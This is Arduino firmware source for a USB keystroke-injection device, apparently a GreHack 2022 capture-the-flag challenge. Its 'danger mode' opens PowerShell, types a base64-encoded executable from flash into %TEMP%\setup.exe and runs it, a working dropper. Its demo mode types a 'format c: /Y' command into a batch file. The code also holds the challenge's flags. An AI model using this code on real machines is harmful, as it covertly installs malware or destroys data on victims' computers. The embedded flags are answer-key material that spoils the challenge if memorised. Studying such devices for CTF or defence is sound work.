
#include <USBComposite.h>

USBHID HID;
HIDKeyboard HID_Keyboard(HID, 0);

#define DELAY_MOD 0
#define DELAY_KEY 0

void key_mapping(unsigned char c) {

  // map a Qwerty to Azerty keyboard. The pig way...
  unsigned char state=0;
  unsigned char converted;
  static unsigned char conv_tbl[]={'@',175,'}',61,'|',45,'[',40,']',41,'{',39,'#',34,'^',174,'`',172,'\\',173,'~','é'-2,'>',236,'<',236};

  // check for the need of ALT & SHIFT
  switch(c) {

    case '~':
    case '#':
    case '{':
    case '[':
    case '|':
    case '`':
    case '\\':
    case '^': //or 183
    case '@':
    case ']':
    case '}':
    
      HID_Keyboard.press(KEY_RIGHT_ALT);
      state=KEY_RIGHT_ALT;
      delay(DELAY_MOD);
      break;
  }

  if (c=='>') {
    
      HID_Keyboard.press(KEY_RIGHT_SHIFT);
      state=KEY_RIGHT_SHIFT;
      delay(DELAY_MOD);
  }

  converted=c;
  for (int i=0; i<26; i+=2) {
    if ( conv_tbl[i]==c ) {
      converted=conv_tbl[i+1];
      break;
    }
  }

  HID_Keyboard.press(converted);
  delay(DELAY_KEY);
  HID_Keyboard.release(converted);
  delay(DELAY_KEY);

  if (state) {
      HID_Keyboard.release(state);
      delay(DELAY_MOD);
  }
  

}

void my_print(unsigned char *ptr, int len) {

  for (int i=0; i<len; i++)
    key_mapping(ptr[i]);

}

// the setup function runs once when you press reset or power the board
void setup() {
  // initialize digital pin LED_BUILTIN as an output.
  pinMode(PC13, OUTPUT);
  //Serial.begin(115200);
  HID.begin(HID_BOOT_KEYBOARD);
  HID_Keyboard.begin(); // needed just in case you need LED support
  delay(4000);
}


void demo_mode() {

  HID_Keyboard.press(KEY_LEFT_GUI);
  delay(10);
  HID_Keyboard.press('r');
  delay(200);
  HID_Keyboard.release('r');
  HID_Keyboard.release(KEY_LEFT_GUI);

  unsigned char str01[] = "cmd\n";
  my_print(str01,strlen((char*)str01));
  delay(500);
  
  unsigned char str02[] = "echo format c: /Y > /gotcha.bat\n";
  my_print(str02,strlen((char*)str02));
  delay(5000);

  unsigned char str03[] = "notepad\n";
  my_print(str03,strlen((char*)str03));
  delay(1000);

  unsigned char str04[] = "Demo mode!\nNothing harmful will be run on your computer.\nLuckily...\nYour flag is:\nGH22{";
  my_print(str04,strlen((char*)str04));

  HID_Keyboard.print("tHis1sthel0nGestfl@geVerUseDf0rachAlleNgeaTGreHackaNDthisShouldBeapainTowr1t31twithOutf1ndingaTrix");

  key_mapping('}');

  HID_Keyboard.press(KEY_LEFT_CTRL);
  delay(10);
  HID_Keyboard.press('a');
  delay(200);
  HID_Keyboard.release('a');
  HID_Keyboard.release(KEY_LEFT_CTRL);

  HID_Keyboard.print("REDACTED");

  delay(100000);
}

void danger_mode() {
  // place holder for canceling compiler optimisation
  if (strcmp((char*)0x0800FF00,"GH22{GG!DFUwasTHEpathTOfollow}"))
    delay(1);

  HID_Keyboard.press(KEY_LEFT_GUI);
  delay(10);
  HID_Keyboard.press('r');
  delay(200);
  HID_Keyboard.release('r');
  HID_Keyboard.release(KEY_LEFT_GUI);

  unsigned char str01[] = "powershell\n";
  my_print(str01,strlen((char*)str01));
  delay(500);

  unsigned char str02[] = "[IO.File]::WriteAllBytes(\"$env:TEMP\\setup.exe\", [Convert]::FromBase64String('";
  my_print(str02,strlen((char*)str02));

  //unsigned char payload_exe[] = "xxxxx";
  my_print((unsigned char*)0x08008000,0x7000);

  unsigned char str03[] = "'))\n";
  my_print(str03,strlen((char*)str03));

  // here, the downloader is in the temp folder

  // compute the serial number of the chip
  char * ptr = (char*)0x1FFFF7E8;
  unsigned char checksum=0;

  checksum=*ptr++;
  checksum^=*ptr++;
  checksum^=*ptr++;
  checksum^=*ptr++;
  checksum^=*ptr++;
  checksum^=*ptr;

  // start construct dropper call
  unsigned char str04[] = "& \"$env:TEMP\\setup.exe\" ";
  my_print(str04,strlen((char*)str04));

  // add the serial number and launch it
  unsigned char str05[10];
  sprintf((char*)str05,"%d\n",checksum);
  my_print(str05,strlen((char*)str05));

  // kill current "cmd"
  unsigned char str06[] = "exit\n";
  my_print(str06,strlen((char*)str06));

  delay(100000);
}

// the loop function runs over and over again forever
void loop() {               

  if (strcmp((char*)0x0800FFF8,"DANGER"))   // run demo mode
    demo_mode();
  else
    // never reach during CTF, but need to be reversed for level 3
    danger_mode();
}
